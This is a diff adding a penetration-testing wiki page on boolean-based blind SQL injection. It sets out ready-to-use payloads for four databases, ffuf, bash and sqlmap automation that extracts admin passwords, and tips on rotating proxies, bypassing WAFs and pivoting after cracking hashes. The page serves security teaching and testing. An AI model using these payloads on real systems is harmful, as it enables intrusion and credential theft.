@@ -1,0 +1,228 @@
+---
+title: Boolean-based Blind SQLi
+description: Extracting data via boolean-inferable response differences when output is not reflected.
+mitre: [T1190, T1213]
+d3fend: [D3-MH, D3-NTA]
+impact: [DataExfil]
+owasp: [A05]
+noise: moderate
+sidebar:
+  order: 6
+  label: Blind (boolean)
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+The application doesn't show query output, but its response *changes* based on whether an injected condition is true or false. Extract data one bit (or character) at a time by binary-searching the value space.
+
+## TL;DR
+
+```sql
+-- Build a payload that is TRUE only if the Nth char of <data> is <c>
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
+
+-- Iterate position 1..L, try chars a-z, A-Z, 0-9, special until response matches "true"
+```
+
+When the response under "true" differs from "false" (different content, length, status code), you can extract any data the DB can `SELECT`.
+
+## When to use
+
+| Symptom | Class |
+|---|---|
+| Errors visible | Use [UNION-based](../union-based/) or error-based |
+| Response identical, only timing differs | Use [Time-based](../blind-time/) |
+| Response differs on logically true vs. false condition | **This page** |
+| No response feedback at all | Use [Out-of-band](../out-of-band/) |
+
+The "true" and "false" responses don't need to be dramatically different - even a single byte difference (a "Welcome back" string, a different image, a status code change) is enough.
+
+## Step 1 - Establish the oracle
+
+Find a payload pair that produces visibly different responses:
+
+```
+1' AND 1=1-- -    → "normal" response
+1' AND 1=2-- -    → "different" response
+```
+
+Note exactly what differs. Common oracles:
+- Response body length
+- Presence of a specific string (`Welcome`, `Found`, etc.)
+- HTTP status code
+- Number of rows returned
+
+This is your boolean oracle. Every subsequent payload reduces to "does this return like 1=1 or like 1=2?".
+
+## Step 2 - Extract length first
+
+Knowing the length saves time:
+
+```sql
+-- Is the password longer than 20 chars?
+' AND LENGTH((SELECT password FROM users WHERE username='admin')) > 20-- -
+
+-- Binary-search the length
+' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 32-- -
+```
+
+For PostgreSQL/Oracle use `LENGTH()`. For MSSQL use `LEN()`.
+
+## Step 3 - Character-by-character extraction
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    ' AND SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' AND 1=1-- -
+    ```
+  </TabItem>
+</Tabs>
+
+Iterate position (1 to L) and character (a-z, A-Z, 0-9, special) until the response matches "true".
+
+## Step 4 - Use comparison instead of equality
+
+Equality requires up to ~94 requests per character (printable ASCII). Comparison (`<`, `>`) lets you binary-search in ~7 requests per character:
+
+```sql
+-- Is the first char's ASCII code > 109 (i.e. > 'm')?
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 109-- -
+```
+
+Algorithm:
+
+<Steps>
+
+1. Set `lo=32, hi=126`.
+2. Pick `mid = (lo+hi)/2`.
+3. Test `> mid`. If true: `lo = mid+1`. If false: `hi = mid`.
+4. Repeat until `lo == hi`. That's the character.
+
+</Steps>
+
+Reduces ~94 requests to ~7 per character. Use this for any extraction over a few characters long.
+
+## Step 5 - Handle case sensitivity
+
+<Aside type="caution">
+MySQL string comparisons are case-insensitive by default. If you don't force binary comparison, you cannot distinguish `A` from `a`.
+</Aside>
+
+Force binary comparison:
+
+```sql
+' AND BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='A'-- -
+```
+
+Or use `STRCMP()`:
+
+```sql
+' AND STRCMP(BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1),'A')=0-- -
+```
+
+For PostgreSQL and Oracle, comparisons are case-sensitive by default - no special handling needed.
+
+## Automation with `ffuf`
+
+Set up a wordlist with one character per line, then have `ffuf` substitute and filter on response size:
+
+```bash
+# Create wordlist
+echo {a..z} {A..Z} {0..9} | tr ' ' '\n' > chars.txt
+
+# Per-position fuzz
+ffuf -w chars.txt:CHAR \
+  -u "https://<TARGET>/page?id=1" \
+  -H "Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='CHAR'-- -" \
+  -fs <SIZE_OF_FALSE_RESPONSE>
+```
+
+Replace `1` with the position, increment for each extracted character. Wrap in a shell loop.
+
+Compact bash loop for full extraction:
+
+```bash
+target="https://<TARGET>/page?id=1"
+cookie_template="TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),POS,1)='CHAR'-- -"
+extracted=""
+
+for pos in {1..32}; do
+  for c in {a..z} {A..Z} {0..9}; do
+    cookie="${cookie_template/POS/$pos}"
+    cookie="${cookie/CHAR/$c}"
+    response=$(curl -s -o /dev/null -w "%{size_download}" -H "Cookie: $cookie" "$target")
+    if [ "$response" != "<FALSE_SIZE>" ]; then
+      extracted="${extracted}${c}"
+      echo "Position $pos: $c (so far: $extracted)"
+      break
+    fi
+  done
+done
+```
+
+## Automation with `sqlmap`
+
+For most blind cases, `sqlmap` is faster than rolling your own:
+
+```bash
+sqlmap -u "https://<TARGET>/page?id=1" \
+  --cookie="TrackingId=xyz*" \
+  --technique=B \
+  --dbms=mysql \
+  --dump -T users -C username,password
+```
+
+The `*` marks the injection point. `--technique=B` restricts to boolean-blind. Use `-r request.txt` to feed a saved request from Burp for complex auth/headers.
+
+## Common payload templates
+
+```sql
+-- "Welcome back" appears only on TRUE
+TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'-- -
+
+-- Same query, with subquery returning value to compare
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'-- -
+
+-- PostgreSQL with || concat
+TrackingId=xyz' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN '' ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- -
+
+-- Oracle with FROM dual
+TrackingId=xyz' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN '' ELSE 'x' END FROM users WHERE username='administrator')-- -
+```
+
+## Common failure modes
+
+- **Response size varies for non-injection reasons** (e.g., timestamps, CSRF tokens) - pick a more stable oracle: HTTP status, presence of a specific string, or a content match.
+- **Rate limit kicks in** - slow the extraction with `--delay` (sqlmap) or `sleep` in the loop. Some targets ban after N requests; rotate through proxies or accept slower extraction.
+- **The query returns no row** (e.g., username doesn't exist) - the entire WHERE clause becomes false regardless of the inner condition. Confirm the target user exists with `SELECT count(*)`.
+- **Quoting breaks the payload** - try alternate quoting: `0x61` instead of `'a'` (MySQL hex literal), `CHR(97)` (Oracle/PostgreSQL), `CHAR(97)` (MSSQL).
+
+## Notes
+
+- Always test the oracle works before automating - wasting an hour discovering your "true" and "false" responses are identical is no fun.
+- Logging the request/response of the first successful character extraction is good evidence for the report.
+- Hashed passwords are always limited charsets. If you know it's MD5/SHA-1, restrict your wordlist to `0-9a-f`. This is a 16-char alphabet vs. 94 - significant speedup even with binary search.
+
+## Next move
+
+- **Two distinct responses confirmed (true vs false)** → automate extraction via sqlmap `-r request.txt --technique=B` or write a Python script - character-by-character via `SUBSTRING((SELECT ...),1,1) > 'M'` binary search
+- **Responses identical regardless of payload** → not boolean-viable; switch to [Time-based blind](/codex/web/sqli/blind-time/)
+- **Response difference is subtle (length only, no content change)** → use `--string=` / `--not-string=` in sqlmap, or Burp Comparer for manual confirmation
+- **WAF blocking on every request** → reduce request rate, encode payloads (URL/hex/Unicode), try [Bypasses](/codex/web/sqli/bypasses/) for `SUBSTRING`/`ASCII`/`AND`-keyword filtering
+- **Got admin hash via blind extraction** → crack offline with hashcat (mode depends on DBMS), then pivot - try against [SSH / MSSQL / WinRM](/codex/network/services/mssql/) on the same host
+- **Extraction too slow for full table dump** → fingerprint the DBMS first ([detection](/codex/web/sqli/detection/)), confirm what's actually accessible, focus on `users` + `admin` tables only
+- **Authenticated endpoint** → consider whether [Second-order](/codex/web/sqli/second-order/) is easier than blind extraction on this surface
